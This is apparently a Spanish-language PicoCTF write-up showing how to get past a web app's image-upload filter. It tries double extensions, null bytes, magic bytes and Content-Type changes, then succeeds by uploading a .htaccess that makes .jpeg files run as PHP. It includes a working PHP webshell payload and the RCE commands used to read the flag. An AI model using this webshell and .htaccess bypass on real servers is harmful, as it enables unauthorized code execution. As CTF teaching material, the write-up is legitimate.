---
layout: single
title: byp4ss3d: PicoCTF
excerpt: "En este challenge, aprenderemos a abusar del fichero *.htaccess* para establecer unas políticas a nivel directorio cual nos permita la subida de archivos maliciosa que cumpla X requisito, persuadiendo la restricción que tiene."
date: 2026-01-25
classes: wide
header:
  teaser: /assets/images/pctf-writeup-byp4ss3d/logo_bp.png
  teaser_home_page: true
  icon: /assets/images/picoCTF.webp
categories:
  - PicoCTF
  - Pentesting
  - Challenge
  - Web
tags:
  - writeup
  - challenge
  - HackingWeb
  - FileUpload
  - AbusingPolitics-htaccess
---

## WRITE UP
Ejemplo: atlas:picoctf.net:63993 (víctima) TTL=  63 LINUX

### ANÁLISIS WEB: RECONOCNIMIENTO

De primeras haremos un *whatweb* para ver las tecnologías, lenguajes... de la página web, igual que <span style="color:lightyellow">Wappalyzer</span> pero por consola.

```bash
whatweb http://atlas:picoctf.net:63993/
```

#### COMO FUNCIONA LA WEB

La web tratara acerca de una identificación de estudiantes mediante una foto de sus respectivo ID. Vamos haber como funciona y que responde.

Seleccionamos una foto **(JPG, PNG or GIF)**, y aceptamos.

Le damos a "UPLOAD ID" para subirla.

Nos dará que se ha subido exitosamente, proporcionándonos un enlace para verlo cual nos enseña la ruta cual se aloja las fotos que se suben. -> <span style="color:lightblue">/images/</span>

Al pincharla en el enlace, se abrirá una pestaña aparte para visualizarla.

### PROBAR PHP MALICIOSO

Anteriormente vimos que no tiene problema al subir imágenes normales. Haber ahora como reacciona ante subidas de archivos con extensiones diferentes a las cuales ya tiene definidas.
En caso de ejecutarse, nos interpretará el comando establecido entre comillas. "**id**"

```php
<?php system("id"); ?>
```

Lo seleccionamos y subimos.

Y como era de esperar, no nos deja. Habrá que buscar otras formas de intentar subirlo.

### TÉCNICAS: VALIDATION BYPASS UPLOAD

En este momento podemos aplicar algunas técnicas que conozcamos que puedan llegar a funcionar:  [Técnicas File Bypass Upload](https://pabloventx.github.io/ayuda-File-ByPass-Upload/)

1) La primera sería poner  ``.png``  para que el servidor compruebe que en la cadena del nombre contiene `.png` (formato deseado), y así ya no compruebe lo que tiene después, que como se muestra en la imagen, un ``.php`` .

```bash
# Dentro tendrá el código a ejecutar
cmd.png.php
```

Le damos a "UPLOAD ID" y la subimos.

No nos deja, vamos a usar otra técnica.

2) Vamos a intentarlo con un <span style="color:cyan">null byte</span>, es un carácter especial que indica el final de una cadena en muchos lenguajes, por lo que la validación puede detenerse antes de la extensión real del archivo. 

```bash
# El servidor aceptará el '.png' y procesara el archivo como '.php'
cmd.php%00.png
```

Lo seleccionamos y subimos.

Nos dirá que se ha subido exitosamente, a ver que pasa si pinchamos para visualizarlo.

Nos dirá que no lo encuentra, quizás se este borrando por algún filtro/norma establecido, o no lo puede leer.

3) Probaremos por último por los "**Magic numbers**". Usado para identificar el archivo mediante los primeros bytes, aparte del propio formato.

Añadimos en la primera línea **(GIF8,PNG...;)** y guardamos.

```php
1 GIF8; (En la primera línea del archivo)
2 <?php 
3   system("whoami"); 
4 ?>
```

Aplicamos un **"file"** para que nos diga de que tipo es el archivo y nos dirá que el *php* es un *gif*.

```bash
file cmd.php
```

Seleccionamos y la subimos "UPLOAD ID".

Nos dirá que no esta permitido así que tocara ir por otro lado.

### BURP SUITE: CONTENT-TYPE y GLOBAL

Cambiamos el código a php a como lo teníamos originalmente.

#### CONFIGURACIÓN FOXY PROXY

En la extensión <span style="color:lightyellow">Foxy Proxy</span> tenemos que seleccionar **Burp Suite**. Tendremos que tenerlo configurado para que tenga conexión con este y así coger los paquetes. 

En *Burp Suite* nos vamos a "Proxy" > "Intercept" > **Intercept on** .Teniendo esta opción activada podremos capturar paquetes y analizarlos.

Para capturar nuestro paquete, subimos el archivo originalmente en *.php* .

Nos lo capturara al momento y en el **Request** nos saldrá toda la información relacionada con lo que la subida acontece.

Dicho paquete lo llevaremos al **Repeater**, apartado donde podremos hacer pruebas con este, cambiando parámetros... "**CTRL + R**"

En este apartado, podemos cambiar el nombre del paquete a nuestro gusto para tener una buena organización...

Es importante quitar el *FoxyProxy* para que no nos capture los paquetes que enviemos ahora, aparte no es necesario ya que no vamos a capturar más paquetes. Le damos a "Send" y como es normal nos devuelve un **Not allowed** en el Response.

A continuación, pasaremos a modificar cosas a ver si conseguimos subir el archivo.
En el campo <span style="color:orange">Content-Type</span>: **application**<span style="color:yellow">/x-php</span>, nos dice que se trata de un *PHP*, lo podríamos cambiar al tipo de archivo <span style="color:yellow">jpeg, png...</span>. 

Le damos a "Send" y en el Response.

Aquí ya jugaríamos con las técnicas usadas anteriormente. Agregando la cadena <span style="color:yellow">.jpeg</span> al nombre y después un <span style="color:yellow">.php</span> . No nos dejará.

Agregando PNG en la primera línea, para que valido esos bytes del archivo. No nos dejara.

### HTACCESS: ESTABLECIMIENTO POLÍTICA NIVEL DIRECTORIO

<span style="color:green">.htaccess</span> -> Archivo configuración a **nivel directorio**, usado por <span style="color:lime
">Apache HTTP Server</span>, que permite modificar el comportamiento del servidor sin tocar la configuración global -> (*httpd.conf* o *apache2.conf*). En este archivo podemos insertar directivas/políticas.

Ahora estableceremos una política cual permita que cualquier archivo que coincida con la extensión puesta o palabra, lo interprete como motor *PHP*.

```bash
# Crea el archivo .htaccess y escribir dentro
nano .htacess
-> addType application/x-httpd-php .jpeg

# Ver el contenido del archivo
cat .htaccess
```

Por otro lado, llamaremos a nuestro <span style="color:lime">cmd.php</span> -> <span style="color:lime">cmd.jpeg</span> y le pondremos para que cuando se suba el archivo, tener una <span style="color:lime">webshell</span> y ejecutar comandos remotamente **(RCE)**.

```php
<?php system($_GET["cmd"]); ?>
```

En la página a la hora de subir, filtramos los archivos ocultos, ya que si nos damos cuenta llamamos a *htaccess* con un "." al principio, por lo cual esta oculto.

Aceptamos.

Le damos a "UPLOAD ID".

Nos dirá que se ha subido exitosamente.

Ahora seleccionamos la <span style="color:lime">webshell</span>, y le damos a "UPLOAD ID".

Se subirá sin que nos salte ninguna prohibición.

Ya tendremos una ejecución remota de comandos mediante el parámetro:

```bash
# Especificar parámetro en URL para ejecutar comandos
cmd.jpeg?cmd=comando
```

### BANDERA

Para leer la bandera nos iremos a la siguiente ruta:

```bash
cmd.jpeg?cmd=cd ../..; ls; cat flag.txt
```

